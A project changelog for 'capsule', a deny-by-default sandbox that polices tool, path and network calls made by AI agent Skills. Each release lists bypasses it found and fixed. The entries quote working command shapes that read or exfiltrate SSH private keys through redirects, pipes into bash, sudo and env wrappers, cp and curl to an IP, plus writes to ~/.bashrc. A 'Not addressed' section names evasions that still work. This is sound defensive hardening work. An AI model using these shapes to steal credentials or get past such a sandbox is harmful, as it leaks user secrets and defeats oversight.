# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.7.0] - 2026-10-27

Multi-surface release: a shell command that touches several capability surfaces
(a read, a redirect write, a network host) is now judged on **all** of them, and
the wrapper and copy shapes that used to hide the real target are classified.
Every shape below was reproduced ALLOWED under the headline `network-deny.yaml`
profile (shell granted) before being fixed.

### Fixed

- **A redirect hid the command's own read/egress surface**
  (`cat ~/.ssh/id_rsa > ./out/leak.txt`, `head -n 5 ~/.ssh/id_rsa > ./out/leak.txt`,
  `curl 1.2.3.4/exfil > ./out/f.txt`, `wget 1.2.3.4/x > ./out/f.txt`,
  `ssh buildbox > ./out/f.txt`, `nc buildbox 22 > ./out/f.txt`). `_parse_segment`
  returned on the first redirect token before classifying the verb, and a
  `CallRequest` could name only one path, so the in-scope redirect write was
  judged alone: the private key was read, and IP/host egress went through, while
  the `~/.ssh/**` deny and the network rule never fired. A `CallRequest` now
  carries every surface the command touches (`CallRequest.extra`) and
  `policy.decide` requires all of them to be permitted — the same fix closes the
  case where an allow-listed egress host shadowed a denied read
  (`curl https://api.internal/v1 && cat ~/.ssh/id_rsa`).

- **`cp` / `mv` / `install` never surfaced a source or destination**
  (`cp ~/.ssh/id_rsa ./out/key`, `mv ~/.ssh/id_rsa ./out/`,
  `install -m 600 ~/.ssh/id_rsa ./out/k`). They were in no verb set, so the call
  degraded to a bare, surface-less shell call — the key was read and copied into
  the in-scope `./out/` tree the same profile lets the Skill read back. This is
  the shape the v0.6.0 grill deferred until a request could carry two paths; the
  copy verbs now surface the last positional as a write and the earlier ones as
  reads.

- **A command wrapper hid the wrapped command** (`sudo cat ~/.ssh/id_rsa`,
  `doas`/`env`/`command`/`exec`/`nohup`/`nice`/`time`/`stdbuf`/`setsid cat
  ~/.ssh/id_rsa`, `env FOO=1 cat ~/.ssh/id_rsa`, `sudo -u root cat
  ~/.ssh/id_rsa`, `sudo curl 1.2.3.4/exfil`). The wrapper verb was unrecognised,
  so the inner command was never inspected — the same wrapper class as the
  v0.5.0 `bash -c` fix. Wrapper verbs are now unwrapped (flags, `KEY=value`
  assignments, and a bare flag value are skipped) and the remainder classified;
  an unrecognised remainder still degrades to a bare shell call, so
  `sudo grep cat ./README.md` is not falsely denied.

- **Version surfaces lagged the tag.** `README.md` and `README.en.md` advertised
  `v0.5.0` on a `v0.6.0` tree, `docs/demo-results.json` recorded `0.5.0`, and
  `CHANGELOG.md` had no `[0.6.0]` link reference with a stale
  `[Unreleased]: .../compare/v0.5.0...HEAD` compare base (so the `## [0.6.0]`
  heading was a dead anchor). All surfaces are now at 0.7.0 and the CHANGELOG
  link references are complete.

### Testing

`tests/test_version_lockstep.py` now asserts every version surface agrees with
`VERSION` (package constant, `pyproject.toml`, CHANGELOG head + link references +
`[Unreleased]` base, both READMEs, `web/site.json`, `docs/demo-results.json`),
so the drift that shipped at v0.4.0 and v0.6.0 fails the suite instead of
shipping. 35 new regression tests across `tests/test_cli.py`,
`tests/test_policy.py` and the lockstep guard; 95 → 133 tests.

### Not addressed

Shell-intent parsing stays deliberately shallow: verbs outside the classified
sets (`dd`, `tar`, `ln`, `busybox`, …) and surface kinds outside the modelled
ones (`<` input redirection, `xargs`-fed arguments, `python -c` payloads) still
degrade to a bare `shell` call, which a profile that grants `shell` allows. A
profile that does not grant `shell` denies them outright. Tightening this is a
parser milestone of its own, not a v0.7.0 fix.

## [0.6.0] - 2026-09-19

Bypass-hunt release: four same-class escapes of the v0.5.0 fixes, all
reproduced under the headline `network-deny.yaml` profile (shell granted)
before being fixed. Every shape was ALLOWED at v0.5.0.

### Fixed

- **Pipe into an interpreter hid the script's target**
  (`echo 'cat ~/.ssh/id_rsa' | bash`). The v0.5.0 fix recursed into
  `bash -c` payloads, but `X | bash` reaches the interpreter with its script
  on stdin — the path hides inside a quoted argument of `X` that token-level
  parsing cannot see. The pipe-into-interpreter shape now scans the preceding
  segments' text for the first path-like substring (mirroring how the raw URL
  scan already catches `echo 'curl …' | sh`), so the read is trapped with
  `path-denied`.

- **Compound commands inspected only the first segment**
  (`true && cat ~/.ssh/id_rsa`, `a; b`, `x || y`). A separator-ended prefix
  (`true &&`) completely hid the rest of the line from the verb classifier.
  `_parse_bash` now splits on `|`, `;`, `&&`, `||` (shlex keeps quoted
  separators inside a token, so `echo 'a|b'` is not split) and parses EVERY
  segment, carrying the strictest surface: any segment's host, then any
  segment's read path, then any write path.

- **Shell output redirects bypassed the write scope** (`echo x > ~/.bashrc`).
  A `>` / `>>` (and `2>` / `&>` forms) redirect target is a file WRITE, but
  no write path was ever surfaced from shell commands, so writes stayed
  outside the profile's `paths.write` scope (`./out/**`). Redirect targets
  now surface as `access="write"` paths — in-scope writes (`> ./out/f.txt`)
  stay allowed.

- **`tee` wrote outside the scope unimpeded** (`tee ~/.bashrc`). Same class:
  a write verb whose target was never inspected; `tee`'s positional target
  now surfaces as a write path.

### Testing

8 new regression tests (`tests/test_cli.py`), each red on the v0.5.0 tree:
the four bypass shapes assert their specific deny rule (`path-denied` /
`network-not-in-profile` / `path-not-in-profile`), and four benign shapes
(in-scope redirect, in-scope pipe-to-tee, quoted pipe, plain read) assert no
over-blocking. 87 → 95 tests.

## [0.5.0] - 2026-09-05

### Fixed
- **head/tail/cat -n flag value bypassed the ~/.ssh path deny**: `_parse_bash`
  grabbed `args[0]` as the file-read path, but a flag's bare value (the `5` in
  `head -n 5`) survived flag-stripping, so `head -n 5 ~/.ssh/id_rsa` extracted
  path `5` (matching `./**`, never the `~/.ssh/**` deny) and was ALLOWED under
  `network-deny.yaml`. The path is now selected via a target selector that
  prefers a `/`/`~`-bearing token, else the first non-numeric arg.
- **`bash -c`/`sh -c` wrapper hid a `cat ~/.ssh/id_rsa` read**: `_parse_bash`
  only inspected the top-level verb, so a shell-interpreter `-c` payload
  degraded to a bare host-less `shell` call that was ALLOWED under
  `network-deny.yaml` (shell granted). Capsule now recurses into the `-c`
  payload of POSIX shell interpreters (bash/sh/zsh/dash/ksh/ash) so a hidden
  file read is trapped with `path-denied`. (A URL hidden in `-c` was already
  caught by the raw URL scan.)
- **host-less `net_fetch` (WebSearch) bypassed the network deny**: a
  `net_fetch`-class call with no URL (notably `WebSearch`, keyed on `query`)
  carried no host, so `decide()` consulted no network rule and was ALLOWED
  under a deny-all-network profile. A `net_fetch` is now fail-closed as
  network egress by definition — when no host resolves it carries a sentinel
  so the network rule is always consulted.
- **version surfaces were left at 0.3.0 through the v0.4.0 tag**: the v0.4.0
  release commit bumped the git tag but not `VERSION`, `__init__.py`,
  `pyproject.toml`, `CHANGELOG.md`, or `web/site.json` (`capsule --version`
  reported 0.3.0 at the v0.4.0 tag). All surfaces are now bumped to 0.5.0 and
  this [0.4.0] entry back-fills the changelog.

### Added
- **`capsule report --json`**: emits a machine-readable run summary
  (`{allowed, blocked, total, log, events:[...]}`) to stdout so a CI pipeline
  can consume it programmatically (e.g. `jq .blocked`); complements the
  existing `capsule run` exit-1-on-block convention. An empty/missing log
  yields a zeroed summary and exit 0.

## [0.4.0] - 2026-08-27

### Fixed
- **single-label host network bypass**: `ssh`/`nc`/`rsync`/`scp` to a
  single-label host (`localhost`, an ssh-config alias) reduced to a host-less
  `shell` call, which `network-deny.yaml` (shell granted, `network.allow: []`)
  waved through — a real egress bypassing the deny-all-network stance. The
  `_NET_CMDS` loop now fail-closes (carries the arg as host) so the network
  rule is consulted.
- **single-label host allow-list was non-functional**: `_extract_host` required
  a dotted TLD, so `localhost` returned `None`; the URL-egress fail-closed then
  carried the raw URL as host, which never matched an `allow: [localhost]`
  entry — explicitly-allowed local egress (a local LLM/Ollama server) was
  silently DENIED. Single-label hostnames are now recognised in `_extract_host`.
- **case-insensitive Skill tool-call bypass**: a lowercase tool verb in a
  Skill's `capsule-calls` block (`bash`/`webfetch`) was matched
  case-sensitively and degraded to a bare host-less `shell` call, waving a
  `curl`/`webfetch` exfil through under a profile that grants `shell`. Tool
  names are now mapped via a case-insensitive index.

## [0.3.0] - 2026-08-21

### Fixed
- **file:// URL bypasses the ~/.ssh deny**: a `file://` URL reduced to a
  host-less, path-less call so only the tool-allow check ran — under
  `network-deny.yaml` (which grants `shell` + `net_fetch`) it was ALLOWED,
  defeating the `~/.ssh/**` path deny and the deny-by-default network stance.
  `file://` is now fail-closed like `http`/`https`: its local path is surfaced
  (so a `~/.ssh/**` deny fires with `path-denied`) and any no-host URL still
  consults the network rule.
- **trap log accumulates across runs**: `capsule run` opened the default
  `.capsule/trap.log` without truncating, so `capsule report` read cumulative
  counts across every run ever written, diverging from the run's own summary.
  The default log is now fresh per run; an explicit `--log <path>` keeps the
  append behaviour (audit retention).

### Changed
- README license label corrected from MIT to Apache-2.0 (the LICENSE is
  Apache-2.0); the English badge was also relabelled.

## [0.2.0] - 2026-08-01

### Fixed
- **m4 — IP-egress bypass**: `curl http://<ip>` (IPv4 or bracketed IPv6) is now
  trapped as a network call (fail-closed) instead of being reduced to a bare
  `shell` call that slipped past the network rule under a profile granting
  `shell`. `_extract_host` recognises IPv4/IPv6 literals, and a matched URL is
  always treated as network egress even when no hostname resolves.

### Added
- **m5 — `capsule init`**: scaffolds `capsule.yaml` + an example
  `readonly.yaml` profile into the current directory (refuses to clobber
  existing files unless `--force`). Closes the happy-path step the v0.1.0 plan
  documented but the v0.1.0 product omitted.

### Changed
- **m6 — pluggable host seam**: new `capsule/hosts/registry.py` (`HOSTS` +
  `get_adapter`, default `claude-code`) and a `--host` flag on `capsule run`.
  A future Codex/Cursor adapter is one registered factory, not an engine change.
  Also fixes relative call-path matching: call paths now resolve against the
  profile's `base_dir`, not `os.getcwd()`, so relative paths match relative
  profile globs regardless of the process working directory.

## [0.1.0] - 2026-06-23

### Added
- **m1 — enforce calls**: deny-by-default capability profile traps a disallowed
  tool/path/network call at the call site and blocks + logs it.
- **m2 — profile & report**: YAML capability-profile schema, per-skill profiles
  bound by skill name, and a readable `capsule report` summary (allowed vs
  blocked) over a run.
- **m3 — ship demo**: reproducible `curl-exfil-demo` Skill plus a quickstart so a
  user sees a real block in under five minutes.

[Unreleased]: https://github.com/SuperMarioYL/capsule/compare/v0.7.0...HEAD
[0.7.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.7.0
[0.6.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.6.0
[0.5.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.5.0
[0.4.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.4.0
[0.3.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.3.0
[0.2.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.2.0
[0.1.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.1.0
